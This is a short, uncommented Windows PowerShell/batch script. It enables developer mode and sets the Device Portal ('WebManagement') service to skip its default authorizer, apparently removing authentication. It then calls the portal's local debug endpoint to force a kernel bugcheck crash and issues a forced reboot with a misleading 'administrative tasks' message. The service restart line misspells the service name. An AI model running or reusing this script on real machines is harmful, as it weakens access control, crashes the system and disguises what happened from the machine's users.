REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" /t REG_DWORD /f /v "AllowDevelopmentWithoutDevLicense" /d "1"
DISM /Online /Add-Capability /CapabilityName:Tools.DeveloperMode.Core~~~~0.0.1.0
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WebManagement\Service"
$valueName = "UseDefaultAuthorizer"
if (Test-Path $regPath) {
    Set-ItemProperty -Path $regPath -Name $valueName -Value 0
} else {
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name $valueName -PropertyType DWORD -Value 0 | Out-Null
}
sc stop webmanagement
sc start webmanagment
$headers = @{
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
}
$resp1 = Invoke-RestMethod -Uri "http://localhost:50080/" -Headers $headers
$resp3 = Invoke-RestMethod -Uri "http://localhost:50080/api/debug/dump/kernel/bugcheck" -Method Post -Headers $headers
shutdown -r -f -t 10 -c "Restarting for administrative tasks"
